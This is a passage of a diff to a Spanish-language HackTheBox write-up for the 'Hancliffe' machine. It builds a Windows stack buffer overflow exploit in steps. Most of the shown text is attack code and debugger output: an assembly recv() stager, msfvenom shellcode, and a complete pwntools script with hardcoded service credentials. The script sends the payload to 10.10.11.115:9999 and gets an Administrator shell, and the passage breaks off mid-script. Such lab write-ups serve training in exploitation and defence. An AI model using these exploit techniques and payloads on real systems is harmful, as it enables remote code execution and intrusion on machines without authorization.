+<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
 recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">De esta manera EBX vale <code class="language-plaintext highlighter-rouge">410</code> y en la pila almacenamos nuestro segundo argumento</p>
-<a href="/hackthebox/hancliffe/22.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/22.png"></p></div></a>
-
-<p class="plain-text">Lo siguiente a almacenar es la direccion donde se escribiran los datos, para ello haremos que <code class="language-plaintext highlighter-rouge">EBX</code> valga lo mismo que <code class="language-plaintext highlighter-rouge">ESP</code> y a esa direccion sumamos <code class="language-plaintext highlighter-rouge">0x64</code> de esa manera estara en un punto de las <code class="language-plaintext highlighter-rouge">A's</code>, asi tenemos el tercer argumento</p>
+<p class="plain-text">Para el siguiente argumento necesitaremos visualizar la memoria en el debugger, asi que enviamos el exploit y avanzamos hasta el final de las instrucciones</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
-</span><span class="p">recv</span><span class="o"> += </span><span class="p">asm(</span><span class="s">"add bx, 0x64"</span><span class="p">)
+<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00f9fed6 ebx=00000138 ecx=007d3b70 edx=000a7190 esi=71901a3d edi=71901a3d  
+eip=719023b3 esp=00f9ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+MyFirstApp+0x23b3:
+719023b3 ffe0            jmp     eax {00f9fed6}
+
+</span><span class="ro">0:000> </span><span class="p">u eax
+00f9fed6 8b742448        mov     esi,dword ptr [esp+48h]
+00f9feda 83ec64          sub     esp,64h
+00f9fedd 31db            xor     ebx,ebx
+00f9fedf 53              push    ebx
+00f9fee0 b704            mov     bh,4
+00f9fee2 53              push    ebx
+00f9fee3 41              inc     ecx
+00f9fee4 41              inc     ecx
+
+</span><span class="ro">0:000></span><span class="p"> g 0x00f9fee3
+eax=00f9fed6 ebx=00000400 ecx=007d3b70 edx=000a7190 esi=00000138 edi=71901a3d  
+eip=00f9fee3 esp=00f9feb0 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+00f9fee3 41              inc     ecx</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestra idea será que el nuevo buffer se escriba en un punto intermedio de las <code class="language-plaintext highlighter-rouge">A's</code> para que sigan ejecutando las instrucciones hasta que en un momento llegue al shellcode, <code class="language-plaintext highlighter-rouge">esp + 0x64</code> es un buen lugar, casi al final de todas las <code class="language-plaintext highlighter-rouge">A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">db esp
+00f9feb0  00 04 00 00 00 00 00 00-65 21 90 71 d6 fe f9 00  ........e!.q....  
+00f9fec0  28 3b 7d 00 fe ff ff ff-14 ff f9 00 e5 5f 6e 76  (;}.........._nv  
+00f9fed0  38 01 00 00 00 ff 8b 74-24 48 83 ec 64 31 db 53  8......t$H..d1.S  
+00f9fee0  b7 04 53 41 41 41 41 41-41 41 41 41 41 41 41 41  ..SAAAAAAAAAAAAA  
+00f9fef0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00f9ff00  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
+00f9ff10  41 41 41 41 41 41 41 41-b3 23 90 71 0a 00 7d 00  AAAAAAAA.#.q..}.  
+00f9ff20  90 3b 7d 00 50 00 00 00-00 00 00 00 00 00 00 00  .;}.P...........  
+
+</span><span class="ro">0:000></span><span class="p"> db esp + 0x64
+00f9ff14  41 41 41 41 b3 23 90 71-0a 00 7d 00 90 3b 7d 00  AAAA.#.q..}..;}.  
+00f9ff24  50 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  P...............  
+00f9ff34  00 4b 33 72 34 6a 40 40-6e 4d 34 6a 40 70 41 68  .K3r4j@@nM4j@pAh  
+00f9ff44  21 54 61 6c 66 69 61 6e-73 79 61 68 12 00 00 00  !Talfiansyah....  
+00f9ff54  90 3b 7d 00 28 3b 7d 00-01 00 00 00 1d 00 00 00  .;}.(;}.........  
+00f9ff64  38 01 00 00 e0 36 7d 00-00 00 00 00 00 00 00 00  8....6}.........  
+00f9ff74  84 ff f9 00 a9 7b 8a 77-38 01 00 00 90 7b 8a 77  .....{.w8....{.w  
+00f9ff84  dc ff f9 00 0b c1 a1 77-38 01 00 00 70 f0 9c 18  .......w8...p...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para almacenar la dirección <code class="language-plaintext highlighter-rouge">esp + 0x64</code> donde se escribira el buffer podemos usar <code class="language-plaintext highlighter-rouge">lea</code> y una vez guardado en el registro <code class="language-plaintext highlighter-rouge">ebx</code> empujamos el puntero al buffer al stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
 </span><span class="p">recv</span><span class="o"> += </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente solo nos queda el ultimo valor que es el <code class="language-plaintext highlighter-rouge">descriptor</code> de socket, como ya lo habiamos almacenado en <code class="language-plaintext highlighter-rouge">ESI</code> solo nos queda hacer un push para subirlo a <code class="language-plaintext highlighter-rouge">ESP</code></p>
+<p class="plain-text">Solo nos queda el ultimo valor que es el <code class="language-plaintext highlighter-rouge">descriptor</code> de socket, como ya lo habiamos almacenado en <code class="language-plaintext highlighter-rouge">esi</code> solo nos queda ejecutar <code class="language-plaintext highlighter-rouge">push</code> para empujarlo al stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esi"</span><span class="p">)</span>
 </code></pre></div></div><br>
-<a href="/hackthebox/hancliffe/23.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/23.png"></p></div></a>
 
-<p class="plain-text">Despues de almacenar los 4 argumentos en el <code class="language-plaintext highlighter-rouge">ESP</code> tenemos el orden que necesitamos para el <code class="language-plaintext highlighter-rouge">recv()</code> con la misma sintaxis que el recv que se hacia antes</p>
-
-<a href="/hackthebox/hancliffe/24.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/24.png"></p></div></a>
-
-<p class="plain-text">Solo nos quedaria mover a <code class="language-plaintext highlighter-rouge">EAX</code> la direccion de la funcion <code class="language-plaintext highlighter-rouge">recv()</code> y llamarla</p>
+<p class="plain-text">Finalmente solo nos queda llamar al desreferenciado de la <code class="language-plaintext highlighter-rouge">IAT</code> de la función <code class="language-plaintext highlighter-rouge">recv()</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x719082ac]"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)</span>
+<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al hacer el <code class="language-plaintext highlighter-rouge">call eax</code> llamara a la funcion <code class="language-plaintext highlighter-rouge">recv()</code> que tomara como argumentos los valores que dejamos en <code class="language-plaintext highlighter-rouge">ESP</code> y abrira un <code class="language-plaintext highlighter-rouge">socket</code>, y cuando enviemos el <code class="language-plaintext highlighter-rouge">shellcode</code> en el nuevo socket guardara esto en <code class="language-plaintext highlighter-rouge">EBX</code> que esta en un punto de nuestras <code class="language-plaintext highlighter-rouge">A's</code></p>
-<a href="/hackthebox/hancliffe/25.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/25.png"></p></div></a>
+<p class="plain-text">Nuestro stager final se ve de esta forma, y ya que solo pesa <code class="language-plaintext highlighter-rouge">25</code> bytes entra sin ningun problema en los <code class="language-plaintext highlighter-rouge">66</code> bytes disponibles que tenemos de espacio con la limitación</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)  
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)  
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de almacenar los 4 argumentos en el <code class="language-plaintext highlighter-rouge">esp</code> tenemos el orden que necesitamos para la llamada a <code class="language-plaintext highlighter-rouge">recv()</code> que recibirá el shellcode, lo escribirá en un punto intermedio de las <code class="language-plaintext highlighter-rouge">A's</code> y al retornar y seguir ejecutando llegará a este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3
+
+</span><span class="ro">0:000> </span><span class="p">g
+Breakpoint 0 hit
+eax=0105fed6 ebx=0000013c ecx=00783b70 edx=000a7190 esi=71901a3d edi=71901a3d  
+eip=719023b3 esp=0105ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+MyFirstApp+0x23b3:
+719023b3 ffe0            jmp     eax {0105fed6}
+
+</span><span class="ro">0:000></span><span class="p"> pc
+eax=766e5f50 ebx=0105ff14 ecx=00783b70 edx=000a7190 esi=0000013c edi=71901a3d  
+eip=0105feef esp=0105fea8 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
+0105feef ffd0            call    eax {WS2_32!recv (766e5f50)}
+
+</span><span class="ro">0:000></span><span class="p"> dds esp L4
+0105fea8  0000013c
+0105feac  0105ff14
+0105feb0  00000400
+0105feb4  00000000</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar tener que abrir un listener en una shell simplemente con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que ejecute <code class="language-plaintext highlighter-rouge">calc.exe</code> para comprobar que funcione</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00'</span><span class="p">
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 220 (iteration=0)
+x86/shikata_ga_nai chosen with final size 220
+Payload size: 220 bytes
+Final size of python file: 1237 bytes
+shellcode =  b""
+shellcode += b"\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4"
+shellcode += b"\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc"
+shellcode += b"\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13"
+shellcode += b"\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0"
+shellcode += b"\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55"
+shellcode += b"\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1"
+shellcode += b"\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7"
+shellcode += b"\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf"
+shellcode += b"\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d"
+shellcode += b"\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79"
+shellcode += b"\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76"
+shellcode += b"\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5"
+shellcode += b"\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f"
+shellcode += b"\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89"
+shellcode += b"\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6"
+shellcode += b"\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0"
+shellcode += b"\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87"
+shellcode += b"\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98"
+shellcode += b"\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb"
+shellcode += b"\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cambiaremos las <code class="language-plaintext highlighter-rouge">A's</code> por <code class="language-plaintext highlighter-rouge">0x90</code> para que ejecute <code class="language-plaintext highlighter-rouge">nop</code> y no <code class="language-plaintext highlighter-rouge">inc ecx</code>, el exploit ejecutará nuestro stager que escribirá el buffer en un punto intermedio de los nops, luego retornará y seguirá la ejecución, al terminar los nops ejecutará el shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm, sleep
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
+junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))
+
+jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
+
+payload</span><span class="o"> =</span><span class="p"> recv</span><span class="o"> +</span><span class="p"> junk </span><span class="o">+ </span><span class="p">jmpeax
+
+shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1</span><span class="s">"</span><span class="p">
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)
+
+sleep(</span><span class="mi">1</span><span class="p">)
+shell.sendline(shellcode)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">call</code> llamara a la función <code class="language-plaintext highlighter-rouge">recv()</code> que tomará como argumentos los valores que dejamos en el stack para cuando enviemos el <code class="language-plaintext highlighter-rouge">shellcode</code> lo guarde en un punto de nuestros <code class="language-plaintext highlighter-rouge">nops</code>, al finalizar ejecuta el shellcode y abre la calculadora</p>
+<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>
 
 <p class="plain-text">Lo que nos queda es crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code> en windows a nuestro host por el puerto 443</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1075,22 +1117,20 @@ shellcode += b"\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f"</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm, sleep
 
-recv </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov esi, dword ptr ds:[esp + 0x48]"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add bx, 0x410"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add bx, 0x64"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esi"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x719082ac]"</span><span class="p">)
-recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
+recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
+recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(recv))
+junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))
 
 jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)
 
@@ -1130,7 +1170,7 @@ shellcode </span><span class="o">=  </span><span class="no">b</span><span class=
 
 </span><span class="p">payload </span><span class="o">= </span><span class="p">recv </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"hancliffe.htb"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
@@ -1144,8 +1184,8 @@ shell.sendline(shellcode)</span>
 <p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to hancliffe.htb on port 9999: Done  
-[</span><span class="az">*</span><span class="p">] Closed connection to hancliffe.htb port 9999</span>
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1155,10 +1195,10 @@ Connection received on 10.10.11.115
 Microsoft Windows [Version 10.0.19043.1266]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
 hancliffe\administrator
 
-C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
 7cc**************************564
 
 C:\Windows\system32></span>
@@ -1169,15 +1209,154 @@ C:\Windows\system32></span>
 <section class="post" id="bof-egghunter">
 <br><h3 class="post-title">Buffer Overflow - egghunter</h3><br>
 
-<p class="plain-text">Otra forma de explotarlo es de una forma muy parecida a la máquina <a href="/hackthebox/bighead">bighead</a> usando un <code class="language-plaintext highlighter-rouge">egghunter</code> para evitar la limitacion de espacio, pero primero igual que antes tendremos que restarle <code class="language-plaintext highlighter-rouge">0x64</code> a ESP para evitar que nos sobreescribamos</p>
+<p class="plain-text">Volvemos al inicio del problema, la limitación de espacio, la pregunta que realmente debemos hacernos es si se guarda en algun otro lugar que no sea el stack, para ello enviaremos <code class="language-plaintext highlighter-rouge">w00tw00t</code> como marca para poder buscar el payload en la memoria</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
